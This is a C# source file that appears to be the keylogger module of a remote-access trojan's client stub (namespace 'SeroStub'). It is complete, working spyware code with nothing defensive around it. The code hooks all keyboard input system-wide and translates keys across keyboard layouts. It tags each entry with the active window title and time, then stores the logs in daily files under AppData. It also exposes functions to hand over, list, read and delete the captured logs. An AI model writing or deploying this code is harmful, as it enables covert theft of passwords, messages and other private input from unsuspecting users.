using System.Runtime.InteropServices;
using System.Text;

namespace SeroStub;

internal static class KeyloggerFeature
{
    // ── WinAPI ─────────────────────────────────────────────────────────────
    [DllImport("user32.dll")] private static extern nint SetWindowsHookEx(int idHook, nint lpfn, nint hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(nint hhk);
    [DllImport("user32.dll")] private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);
    [DllImport("user32.dll")] private static extern nint GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int GetWindowText(nint hWnd, StringBuilder sb, int cch);
    [DllImport("user32.dll")] private static extern bool GetMessage(out MSG msg, nint hWnd, uint min, uint max);
    [DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")] private static extern nint DispatchMessage(ref MSG msg);
    [DllImport("user32.dll")] private static extern bool PostThreadMessage(uint tid, uint msg, nint wp, nint lp);
    [DllImport("user32.dll")] private static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int ToUnicodeEx(uint vk, uint sc, byte[] ks, StringBuilder buf, int sz, uint flags, nint hkl);
    [DllImport("user32.dll")] private static extern nint GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(nint hWnd, out uint lpdwProcessId);
    [DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public nint hwnd; public uint message; public nint wParam; public nint lParam; public uint time; public int x, y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public nint dwExtraInfo; }

    private const int  WH_KEYBOARD_LL = 13;
    private const int  WM_KEYDOWN     = 0x0100;
    private const int  WM_SYSKEYDOWN  = 0x0104;
    private const uint WM_QUIT        = 0x0012;

    // ── Disk logging ────────────────────────────────────────────────────────
    private static readonly string _logDir =
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     Config.PersistName, "kl");

    private static string TodayFile =>
        Path.Combine(_logDir, DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");

    // Flush in-memory buffer to disk every 30 seconds
    private static readonly System.Timers.Timer _flushTimer = new(30_000) { AutoReset = true };

    static KeyloggerFeature()
    {
        _flushTimer.Elapsed += (_, _) => FlushToDisk();
    }

    private static void FlushToDisk()
    {
        string text;
        lock (_bufLock)
        {
            if (_buf.Length == 0) return;
            text = _buf.ToString();
            _buf.Clear();
        }
        try
        {
            Directory.CreateDirectory(_logDir);
            File.AppendAllText(TodayFile, text, Encoding.UTF8);
        }
        catch { }
    }

    // ── State ───────────────────────────────────────────────────────────────
    private static nint          _hook;
    private static Thread?       _thread;
    private static volatile bool _running;
    private static uint          _threadId;
    private static readonly StringBuilder _buf       = new();
    private static readonly object        _bufLock   = new();
    private static readonly object        _startLock = new();
    private static nint   _lastHwnd;
    private static string _lastTitle = string.Empty;

    // ── Public API ──────────────────────────────────────────────────────────

    internal static bool IsRunning => _running;

    internal static void Start()
    {
        lock (_startLock) { if (_running) return; _running = true; }
        _flushTimer.Start();
        _thread = new Thread(HookThread) { IsBackground = true, Name = "KL" };
        _thread.Start();
    }

    internal static void Stop()
    {
        lock (_startLock) { if (!_running) return; _running = false; }
        _flushTimer.Stop();
        FlushToDisk();
        if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
        _thread?.Join(3000);
        _thread = null;
        _threadId = 0;
    }

    internal static string GetAndClearLogs()
    {
        string text;
        lock (_bufLock)
        {
            text = _buf.ToString();
            _buf.Clear();
        }
        // Also persist to disk so the daily log file stays complete
        if (text.Length > 0)
        {
            try
            {
                Directory.CreateDirectory(_logDir);
                File.AppendAllText(TodayFile, text, Encoding.UTF8);
            }
            catch { }
        }
        return text;
    }

    // ── File management ─────────────────────────────────────────────────────

    internal static KeyloggerFileInfo[] GetLogFiles()
    {
        try
        {
            if (!Directory.Exists(_logDir)) return [];
            return Directory.GetFiles(_logDir, "*.txt")
                .Select(f => new KeyloggerFileInfo { Filename = Path.GetFileName(f), Size = new FileInfo(f).Length })
                .OrderByDescending(x => x.Filename)
                .ToArray();
        }
        catch { return []; }
    }

    internal static string GetFileContent(string filename)
    {
        try
        {
            var safe = Path.GetFileName(filename);
            var path = Path.Combine(_logDir, safe);
            if (!File.Exists(path)) return "";
            return File.ReadAllText(path, Encoding.UTF8);
        }
        catch { return ""; }
    }

    internal static void DeleteFile(string filename)
    {
        try
        {
            var safe = Path.GetFileName(filename);
            File.Delete(Path.Combine(_logDir, safe));
        }
        catch { }
    }

    // ── Hook thread ─────────────────────────────────────────────────────────

    private static unsafe void HookThread()
    {
        _threadId = GetCurrentThreadId();
        var fp = (delegate* unmanaged<int, nint, nint, nint>)&HookProc;
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, (nint)fp, nint.Zero, 0);

        if (_hook == nint.Zero) { _running = false; return; }

        while (_running && GetMessage(out var msg, nint.Zero, 0, 0))
        {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }

        UnhookWindowsHookEx(_hook);
        _hook = nint.Zero;
    }

    [UnmanagedCallersOnly]
    private static nint HookProc(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
            try { ProcessKey(lParam); } catch { }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }

    private static void ProcessKey(nint lParam)
    {
        var khs = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
        uint vk = khs.vkCode;
        uint sc = khs.scanCode;

        if (vk is 0xA0 or 0xA1 or 0xA2 or 0xA3 or 0xA4 or 0xA5
                or 0x5B or 0x5C or 0x10 or 0x11 or 0x12) return;

        var hwnd = GetForegroundWindow();
        if (hwnd != _lastHwnd)
        {
            _lastHwnd = hwnd;
            var sb = new StringBuilder(256);
            GetWindowText(hwnd, sb, 256);
            string title = sb.ToString();
            if (title != _lastTitle && !string.IsNullOrEmpty(title))
            {
                _lastTitle = title;
                lock (_bufLock)
                {
                    if (_buf.Length > 0) _buf.AppendLine();
                    _buf.AppendLine($"\r\n[ {title} — {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC ]");
                }
            }
        }

        // Resolve the keyboard layout of the foreground window's thread so non-Latin
        // layouts (Arabic, Russian, Greek, CJK, etc.) translate correctly.
        // ToUnicode uses the calling thread's layout; ToUnicodeEx accepts an explicit handle.
        uint threadId = GetWindowThreadProcessId(hwnd, out _);
        nint hkl = GetKeyboardLayout(threadId);

        var ks = new byte[256];
        GetKeyboardState(ks);
        var charBuf = new StringBuilder(8);
        // Flag 4 = don't modify the dead-key state — avoids breaking ^+a→â composition in the target app
        int n = ToUnicodeEx(vk, sc, ks, charBuf, 8, 4, hkl);
        string chars = n > 0 ? charBuf.ToString(0, n) : (charBuf.Length > 0 ? charBuf.ToString(0, 1) : "");

        lock (_bufLock)
        {
            if (n > 0 && chars.Length > 0 && !char.IsControl(chars[0]))
                _buf.Append(chars);
            else if (n < 0)
            {
                // Dead key pressed (^, ¨, ~, …) — log it as-is so the log is readable
                if (chars.Length > 0) _buf.Append(chars[0]);
            }
            else
            {
                string? special = VkToLabel(vk);
                if (special != null) _buf.Append(special);
            }

            // Keep buffer bounded — flush to disk before it overflows
            if (_buf.Length > 256 * 1024)
            {
                var text = _buf.ToString();
                _buf.Clear();
                Task.Run(() =>
                {
                    try { Directory.CreateDirectory(_logDir); File.AppendAllText(TodayFile, text, Encoding.UTF8); } catch { }
                });
            }
        }
    }

    private static string? VkToLabel(uint vk) => vk switch
    {
        0x08 => "[Back]", 0x09 => "[Tab]", 0x0D => "\n[Enter]\n",
        0x1B => "[Esc]",  0x20 => " ",     0x2E => "[Del]", 0x2D => "[Ins]",
        0x21 => "[PgUp]", 0x22 => "[PgDn]", 0x23 => "[End]", 0x24 => "[Home]",
        0x25 => "[←]",    0x26 => "[↑]",    0x27 => "[→]",   0x28 => "[↓]",
        0x70 => "[F1]",  0x71 => "[F2]",  0x72 => "[F3]",  0x73 => "[F4]",
        0x74 => "[F5]",  0x75 => "[F6]",  0x76 => "[F7]",  0x77 => "[F8]",
        0x78 => "[F9]",  0x79 => "[F10]", 0x7A => "[F11]", 0x7B => "[F12]",
        0x14 => "[Caps]", 0x90 => "[NumLk]",
        _ => null
    };
}

// ── Data types ────────────────────────────────────────────────────────────────
internal class KeyloggerLogsResultStub { public string Logs { get; set; } = ""; public bool IsRunning { get; set; } }
internal class KeyloggerFileInfo       { public string Filename { get; set; } = ""; public long Size { get; set; } }
internal class KeyloggerFilesResultStub { public List<KeyloggerFileInfo> Files { get; set; } = []; public bool IsRunning { get; set; } }
internal class KeyloggerGetFileStub    { public string Filename { get; set; } = ""; }
internal class KeyloggerFileContentStub { public string Filename { get; set; } = ""; public string Content { get; set; } = ""; }
